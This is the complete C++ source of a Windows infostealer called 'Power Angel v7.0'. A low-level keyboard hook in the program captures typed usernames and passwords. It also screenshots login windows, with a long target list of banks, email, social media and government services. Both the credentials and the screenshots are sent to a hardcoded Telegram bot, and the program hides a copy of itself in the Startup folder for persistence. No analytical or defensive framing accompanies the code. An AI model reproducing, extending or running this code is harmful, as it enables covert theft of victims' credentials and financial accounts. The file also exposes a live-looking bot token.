#define WIN32_LEAN_AND_MEAN
#define STRICT
#define _CRT_SECURE_NO_WARNINGS
#define UNICODE

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <commctrl.h>
#include <shellapi.h>
#include <mutex>
#include <thread>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <map>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")

using namespace Gdiplus;

// ==================== CONFIGURATION ====================
const char* BOT_TOKEN_ANSI = "7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const char* CHAT_ID_ANSI = "7845441585";
const wchar_t* MUTEX_NAME = L"PowerAngel_v7.0_SmartEdition";

// ==================== GLOBAL VARIABLES ====================
std::mutex g_mutex;
std::wstring g_username, g_password;
bool g_running = true;
ULONG_PTR g_gdiplusToken;
HHOOK g_hKeyboardHook = NULL;
std::wstring g_currentField;

// ==================== SMART SCREENSHOT CONTROL ====================
std::wstring g_lastScreenshotTitle = L"";
DWORD g_lastScreenshotTime = 0;
std::map<std::wstring, DWORD> g_windowScreenshotHistory;
int g_totalScreenshots = 0;

// ==================== DEBUG LOGGING ====================
void DebugLog(const std::wstring& message) {
    std::wofstream logfile(L"power_angel.log", std::ios::app);
    if (logfile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        logfile << L"[" << st.wHour << L":" << st.wMinute << L":" << st.wSecond << L"] ";
        logfile << message << std::endl;
        logfile.close();
    }
}

// ==================== UTF8 CONVERSION ====================
std::string WStringToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size_needed, NULL, NULL);
    str.pop_back();
    return str;
}

// ==================== URL ENCODING ====================
std::string URLEncode(const std::string& value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    
    for (char c : value) {
        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~' || c == ' ' || c == '\n') {
            if (c == ' ') escaped << '+';
            else if (c == '\n') escaped << "%0A";
            else escaped << c;
        } else {
            escaped << '%' << std::setw(2) << int((unsigned char)c);
        }
    }
    return escaped.str();
}

// ==================== TELEGRAM MESSAGE SENDER ====================
bool SendTelegram(const std::wstring& message) {
    std::string utf8_msg = WStringToUTF8(message);
    std::string encoded_msg = URLEncode(utf8_msg);
    std::string post_data = "chat_id=" + std::string(CHAT_ID_ANSI) + "&text=" + encoded_msg;
    
    DebugLog(L"[TELEGRAM] Sending: " + message.substr(0, min(50, (int)message.length())));
    
    HINTERNET session = WinHttpOpen(L"PowerAngel/7.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;
    
    WinHttpSetTimeouts(session, 30000, 30000, 30000, 30000);
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::wstring wtoken(BOT_TOKEN_ANSI, BOT_TOKEN_ANSI + strlen(BOT_TOKEN_ANSI));
    std::wstring url = L"/bot" + wtoken + L"/sendMessage";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", url.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }
    
    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    WinHttpAddRequestHeaders(request, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL result = WinHttpSendRequest(request, 
                                    WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 
                                    (DWORD)post_data.length(), 0);
    
    if (result) {
        DWORD bytesWritten = 0;
        result = WinHttpWriteData(request, post_data.c_str(), 
                                 (DWORD)post_data.length(), &bytesWritten);
        if (result) {
            result = WinHttpReceiveResponse(request, NULL);
        }
    }
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    return result != FALSE;
}

// ==================== TELEGRAM PHOTO UPLOADER ====================
bool SendTelegramPhoto(const std::wstring& filepath, const std::wstring& caption = L"") {
    DebugLog(L"[UPLOAD] Photo: " + filepath);
    
    HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, 
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> fileData(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    if (bytesRead != fileSize) return false;
    
    char boundary[64];
    sprintf_s(boundary, "----AngelBoundary%llu", GetTickCount64());
    
    std::string caption_str = WStringToUTF8(caption.empty() ? 
        L"📸 Power Angel v7.0 - Smart Screenshot" : caption);
    
    std::string header = 
        std::string("--") + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + 
        std::string(CHAT_ID_ANSI) + "\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" +
        caption_str + "\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"photo\"; filename=\"capture.jpg\"\r\n"
        "Content-Type: image/jpeg\r\n\r\n";
    
    std::string footer = "\r\n--" + std::string(boundary) + "--\r\n";
    
    std::vector<BYTE> postData;
    postData.insert(postData.end(), header.begin(), header.end());
    postData.insert(postData.end(), fileData.begin(), fileData.end());
    postData.insert(postData.end(), footer.begin(), footer.end());
    
    HINTERNET session = WinHttpOpen(L"PowerAngel/7.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;
    
    WinHttpSetTimeouts(session, 60000, 60000, 60000, 60000);
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::wstring wtoken(BOT_TOKEN_ANSI, BOT_TOKEN_ANSI + strlen(BOT_TOKEN_ANSI));
    std::wstring photourl = L"/bot" + wtoken + L"/sendPhoto";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", photourl.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::string contentType = "Content-Type: multipart/form-data; boundary=" + std::string(boundary);
    std::wstring wcontentType(contentType.begin(), contentType.end());
    WinHttpAddRequestHeaders(request, wcontentType.c_str(), (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL result = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    postData.data(), (DWORD)postData.size(), 
                                    (DWORD)postData.size(), 0);
    
    if (result) WinHttpReceiveResponse(request, NULL);
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    DeleteFileW(filepath.c_str());
    
    return result != FALSE;
}

// ==================== KEYBOARD HOOK ====================
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        
        if (pKb->vkCode == VK_TAB) {
            if (!g_currentField.empty()) {
                if (g_username.empty()) {
                    g_username = g_currentField;
                    DebugLog(L"[KEYLOG] Username: " + g_username);
                } else {
                    g_password = g_currentField;
                    DebugLog(L"[KEYLOG] Password captured");
                }
                g_currentField.clear();
            }
            return 1;
        }
        
        if (pKb->vkCode == VK_RETURN) {
            if (!g_username.empty() && !g_password.empty()) {
                std::wstring creds = L"🔐 POWER ANGEL v7.0 - CREDENTIALS\n"
                                     L"═══════════════════════════\n"
                                     L"👤 USERNAME: " + g_username + L"\n"
                                     L"🔑 PASSWORD: " + g_password + L"\n"
                                     L"═══════════════════════════\n"
                                     L"🕒 " + std::to_wstring(GetTickCount() / 1000) + L"s after start";
                
                SendTelegram(creds);
                
                g_username.clear();
                g_password.clear();
                g_currentField.clear();
            }
            return 1;
        }
        
        // Capture alphanumeric and space
        if ((pKb->vkCode >= 0x30 && pKb->vkCode <= 0x39) || 
            (pKb->vkCode >= 0x41 && pKb->vkCode <= 0x5A) ||
            pKb->vkCode == VK_SPACE || pKb->vkCode == VK_OEM_MINUS ||
            pKb->vkCode == VK_OEM_PERIOD || pKb->vkCode == VK_OEM_COMMA ||
            pKb->vkCode == VK_OEM_1 || pKb->vkCode == VK_OEM_2) {
            
            // Skip if control key is pressed
            if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            BYTE keyState[256] = {0};
            WCHAR buffer[10] = {0};
            GetKeyboardState(keyState);
            
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) keyState[VK_SHIFT] = 0x80;
            if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) keyState[VK_CAPITAL] = 0x01;
            
            int result = ToUnicode(pKb->vkCode, pKb->scanCode, keyState, buffer, 10, 0);
            if (result > 0) {
                g_currentField += buffer[0];
            }
        }
        
        // Handle backspace
        if (pKb->vkCode == VK_BACK && !g_currentField.empty()) {
            g_currentField.pop_back();
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// ==================== WINDOW UTILITIES ====================
std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";
    
    WCHAR title[512];
    if (GetWindowTextW(hwnd, title, 512) > 0) {
        return std::wstring(title);
    }
    return L"";
}

// ==================== SMART LOGIN DETECTION ====================
bool IsLoginPage(const std::wstring& title) {
    if (title.empty()) return false;
    
    std::wstring lower = title;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
    
    // Comprehensive login page detection
    std::vector<std::wstring> loginPatterns = {
        // Direct login keywords
        L"sign in", L"log in", L"login", L"signin", L"sign-in", L"log-in",
        L"password", L"passwort", L"contraseña", L"mot de passe",
        L"account", L"acceso", L"accesso", L"zugang",
        L"authenticate", L"authentication", L"authentifizierung",
        L"enter password", L"enter your password",
        L"welcome", L"willkommen", L"bienvenue", L"benvenuto",
        L"secure login", L"secure sign in",
        
        // Common phrases
        L"please log in", L"please sign in",
        L"enter credentials", L"enter your credentials",
        L"user name", L"username", L"email address",
        L"phone number", L"mobile number",
        
        // Form elements
        L"forgot password", L"forgot your password",
        L"remember me", L"keep me signed in",
        L"new user", L"register", L"create account"
    };
    
    // Popular websites and services
    std::vector<std::wstring> targetSites = {
        // Email services
        L"gmail", L"google", L"outlook", L"hotmail", L"yahoo mail", L"yandex",
        L"protonmail", L"icloud", L"aol mail",
        
        // Social media
        L"facebook", L"twitter", L"instagram", L"linkedin", L"tiktok",
        L"snapchat", L"pinterest", L"reddit",
        
        // Banking and finance
        L"bank", L"paypal", L"venmo", L"cash app", L"zelle",
        L"chase", L"wells fargo", L"bank of america", L"citibank",
        L"capital one", L"american express", L"mastercard", L"visa",
        
        // E-commerce
        L"amazon", L"ebay", L"etsy", L"aliexpress", L"walmart",
        L"target", L"best buy", L"newegg",
        
        // Streaming
        L"netflix", L"hulu", L"disney+", L"hbo max", L"prime video",
        L"spotify", L"youtube premium", L"twitch",
        
        // Work and productivity
        L"microsoft", L"office 365", L"teams", L"slack", L"zoom",
        L"dropbox", L"google drive", L"onedrive",
        
        // Gaming
        L"steam", L"epic games", L"origin", L"battlenet", L"xbox",
        L"playstation", L"nintendo",
        
        // Communication
        L"whatsapp", L"telegram", L"discord", L"signal", L"skype",
        L"viber", L"wechat",
        
        // Government and official
        L"irs", L"gov", L"state", L"passport", L"visa application",
        L"social security"
    };
    
    // Check for login patterns
    for (const auto& pattern : loginPatterns) {
        if (lower.find(pattern) != std::wstring::npos) {
            DebugLog(L"[DETECT] Login pattern: " + pattern + L" in: " + title);
            return true;
        }
    }
    
    // Check for target sites
    for (const auto& site : targetSites) {
        if (lower.find(site) != std::wstring::npos) {
            // Additional verification: check for input fields
            HWND hwnd = GetForegroundWindow();
            if (hwnd) {
                // Look for password field specifically
                HWND passwordField = FindWindowExW(hwnd, NULL, L"Edit", NULL);
                while (passwordField) {
                    DWORD style = GetWindowLongW(passwordField, GWL_STYLE);
                    if (style & ES_PASSWORD) {
                        DebugLog(L"[DETECT] Password field found in: " + title);
                        return true;
                    }
                    passwordField = FindWindowExW(hwnd, passwordField, L"Edit", NULL);
                }
                
                // Look for any input field
                HWND editField = FindWindowExW(hwnd, NULL, L"Edit", NULL);
                if (editField) {
                    DebugLog(L"[DETECT] Input field found in: " + title);
                    return true;
                }
            }
        }
    }
    
    return false;
}

// ==================== SMART SCREENSHOT THROTTLING ====================
bool ShouldTakeScreenshot(const std::wstring& windowTitle) {
    DWORD currentTime = GetTickCount();
    
    // Basic validations
    if (windowTitle.empty()) {
        DebugLog(L"[SKIP] Empty window title");
        return false;
    }
    
    HWND hwnd = GetForegroundWindow();
    if (!hwnd || IsIconic(hwnd)) {
        DebugLog(L"[SKIP] Window minimized or invalid");
        return false;
    }
    
    // Don't screenshot system/empty windows
    if (windowTitle == L"Program Manager" || windowTitle == L"Start" || 
        windowTitle.find(L"MSCTFIME UI") != std::wstring::npos) {
        return false;
    }
    
    // 🔥 PER-WINDOW COOLDOWN: 5 minutes
    auto it = g_windowScreenshotHistory.find(windowTitle);
    if (it != g_windowScreenshotHistory.end()) {
        DWORD timeSinceLast = currentTime - it->second;
        if (timeSinceLast < 300000) { // 5 minutes = 300,000 ms
            DebugLog(L"[SKIP] Cooldown for '" + windowTitle + L"' (" + 
                    std::to_wstring(300 - (timeSinceLast/1000)) + L"s remaining)");
            return false;
        }
    }
    
    // 🔥 GLOBAL COOLDOWN: 45 seconds minimum between screenshots
    if (currentTime - g_lastScreenshotTime < 45000) { // 45 seconds
        DebugLog(L"[SKIP] Global cooldown (" + 
                std::to_wstring(45 - ((currentTime - g_lastScreenshotTime)/1000)) + L"s remaining)");
        return false;
    }
    
    // Verify it's a login page
    if (!IsLoginPage(windowTitle)) {
        return false;
    }
    
    // Check window size (skip tiny windows)
    RECT rc;
    GetWindowRect(hwnd, &rc);
    int width = rc.right - rc.left;
    int height = rc.bottom - rc.top;
    
    if (width < 300 || height < 200) {
        DebugLog(L"[SKIP] Window too small: " + std::to_wstring(width) + L"x" + std::to_wstring(height));
        return false;
    }
    
    // 🔥 SUCCESS - Update tracking
    g_windowScreenshotHistory[windowTitle] = currentTime;
    g_lastScreenshotTime = currentTime;
    g_lastScreenshotTitle = windowTitle;
    g_totalScreenshots++;
    
    DebugLog(L"[APPROVED] Screenshot #" + std::to_wstring(g_totalScreenshots) + 
             L" for: " + windowTitle);
    
    return true;
}

// ==================== SCREENSHOT CAPTURE ====================
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc(size);
    if (!pImageCodecInfo) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}

bool TakeSmartScreenshot() {
    std::wstring title = GetActiveWindowTitle();
    
    // Smart decision making
    if (!ShouldTakeScreenshot(title)) {
        return false;
    }
    
    // Small delay for window stabilization
    Sleep(500);
    
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return false;
    
    // Capture window
    HDC hdcScreen = GetDC(hwnd);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    RECT rc;
    GetWindowRect(hwnd, &rc);
    
    int width = rc.right - rc.left;
    int height = rc.bottom - rc.top;
    
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, width, height);
    HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    // Convert to GDI+ bitmap
    Bitmap* bmp = Bitmap::FromHBITMAP(hbm, NULL);
    
    // Cleanup GDI resources
    SelectObject(hdcMem, old);
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(hwnd, hdcScreen);
    
    if (!bmp) return false;
    
    // Get JPEG encoder
    CLSID jpegClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) == -1) {
        delete bmp;
        return false;
    }
    
    // Create temp filename
    WCHAR tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR filename[MAX_PATH];
    swprintf_s(filename, L"angel_%d_%02d%02d%02d.jpg",
               g_totalScreenshots, st.wHour, st.wMinute, st.wSecond);
    wcscat_s(tempPath, filename);
    
    // Set JPEG quality
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 80; // Balanced quality
    encoderParams.Parameter[0].Value = &quality;
    
    // Save image
    Status stat = bmp->Save(tempPath, &jpegClsid, &encoderParams);
    delete bmp;
    
    if (stat != Ok) {
        DebugLog(L"[ERROR] Failed to save screenshot");
        return false;
    }
    
    // Create informative caption
    std::wstring caption = L"🖼️ POWER ANGEL v7.0 - Smart Capture\n"
                          L"═══════════════════════════\n"
                          L"📁 Window: " + title + L"\n"
                          L"🔢 Capture: #" + std::to_wstring(g_totalScreenshots) + L"\n"
                          L"🕒 Time: " + std::to_wstring(st.wHour) + L":" + 
                          std::to_wstring(st.wMinute) + L":" + std::to_wstring(st.wSecond) + L"\n"
                          L"📏 Size: " + std::to_wstring(width) + L"x" + std::to_wstring(height) + L"\n"
                          L"═══════════════════════════";
    
    // Send to Telegram
    bool success = SendTelegramPhoto(tempPath, caption);
    
    if (success) {
        DebugLog(L"[SUCCESS] Screenshot #" + std::to_wstring(g_totalScreenshots) + L" sent");
    } else {
        DebugLog(L"[ERROR] Failed to upload screenshot");
        DeleteFileW(tempPath);
    }
    
    return success;
}

// ==================== PERSISTENCE ====================
void InstallPersistence() {
    WCHAR path[MAX_PATH], startup[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    GetEnvironmentVariableW(L"APPDATA", startup, MAX_PATH);
    wcscat_s(startup, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PowerAngel.exe");
    
    if (CopyFileW(path, startup, FALSE)) {
        DebugLog(L"[PERSISTENCE] Installed to startup");
        
        // Set hidden attribute
        SetFileAttributesW(startup, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
}

// ==================== HEARTBEAT THREAD ====================
void HeartbeatThread() {
    // Initial delay
    std::this_thread::sleep_for(std::chrono::minutes(2));
    
    while (g_running) {
        std::wstring status = L"💓 POWER ANGEL v7.0 - STATUS REPORT\n"
                             L"═══════════════════════════\n"
                             L"✅ System: ACTIVE\n"
                             L"📸 Screenshots: " + std::to_wstring(g_totalScreenshots) + L"\n"
                             L"⌨️ Keylogger: ACTIVE\n"
                             L"🛡️ Persistence: ACTIVE\n"
                             L"═══════════════════════════\n"
                             L"🕒 Uptime: " + std::to_wstring(GetTickCount() / 3600000) + L" hours";
        
        SendTelegram(status);
        
        // Send every 8 hours
        std::this_thread::sleep_for(std::chrono::hours(8));
    }
}

// ==================== SCREENSHOT THREAD ====================
void ScreenshotThread() {
    DWORD lastCleanup = GetTickCount();
    
    while (g_running) {
        DWORD currentTime = GetTickCount();
        
        // Cleanup old history entries every 2 hours
        if (currentTime - lastCleanup > 7200000) { // 2 hours
            std::vector<std::wstring> toRemove;
            
            for (const auto& entry : g_windowScreenshotHistory) {
                if (currentTime - entry.second > 14400000) { // 4 hours
                    toRemove.push_back(entry.first);
                }
            }
            
            for (const auto& window : toRemove) {
                g_windowScreenshotHistory.erase(window);
            }
            
            lastCleanup = currentTime;
            DebugLog(L"[CLEANUP] Removed " + std::to_wstring(toRemove.size()) + L" old entries");
        }
        
        // Take screenshot if conditions are met
        TakeSmartScreenshot();
        
        // Adaptive sleep based on current activity
        std::wstring currentTitle = GetActiveWindowTitle();
        if (!currentTitle.empty() && IsLoginPage(currentTitle)) {
            // Active login page - check more frequently
            std::this_thread::sleep_for(std::chrono::seconds(8));
        } else {
            // No login page - check less frequently
            std::this_thread::sleep_for(std::chrono::seconds(20));
        }
    }
}

// ==================== MAIN ENTRY POINT ====================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Initialize logging
    DeleteFileW(L"power_angel.log");
    DebugLog(L"═══════════════════════════");
    DebugLog(L"🚀 POWER ANGEL v7.0 - SMART EDITION");
    DebugLog(L"═══════════════════════════");
    DebugLog(L"[INIT] Starting initialization...");
    
    // Single instance check
    HANDLE mutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        DebugLog(L"[INIT] Another instance already running. Exiting.");
        return 0;
    }
    
    // Initialize GDI+
    GdiplusStartupInput input;
    GdiplusStartup(&g_gdiplusToken, &input, NULL);
    DebugLog(L"[INIT] GDI+ initialized");
    
    // Initial stealth delay
    Sleep(10000);
    
    // Send startup notification
    std::wstring startupMsg = L"⚡ POWER ANGEL v7.0 - DEPLOYMENT SUCCESSFUL\n"
                             L"═══════════════════════════\n"
                             L"🎯 Version: 7.0 - Smart Edition\n"
                             L"📊 Features:\n"
                             L"   • Smart Screenshot Throttling\n"
                             L"   • Intelligent Login Detection\n"
                             L"   • Duplicate Prevention System\n"
                             L"   • 5-Minute Window Cooldown\n"
                             L"   • 45-Second Global Cooldown\n"
                             L"   • Comprehensive Site Database\n"
                             L"═══════════════════════════\n"
                             L"✅ All systems operational";
    
    SendTelegram(startupMsg);
    DebugLog(L"[INIT] Startup message sent");
    
    // Install persistence
    InstallPersistence();
    
    // Install keyboard hook
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (g_hKeyboardHook) {
        DebugLog(L"[INIT] Keyboard hook installed");
    }
    
    // Start worker threads
    std::thread heartbeat(HeartbeatThread);
    std::thread screenshot(ScreenshotThread);
    
    DebugLog(L"[INIT] All threads started. Entering main loop.");
    
    // Main message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    DebugLog(L"[SHUTDOWN] Initiating shutdown sequence...");
    g_running = false;
    
    if (heartbeat.joinable()) heartbeat.join();
    if (screenshot.joinable()) screenshot.join();
    
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
        DebugLog(L"[SHUTDOWN] Keyboard hook removed");
    }
    
    GdiplusShutdown(g_gdiplusToken);
    
    if (mutex) ReleaseMutex(mutex);
    
    DebugLog(L"[SHUTDOWN] Clean shutdown complete");
    DebugLog(L"═══════════════════════════");
    
    return 0;
}
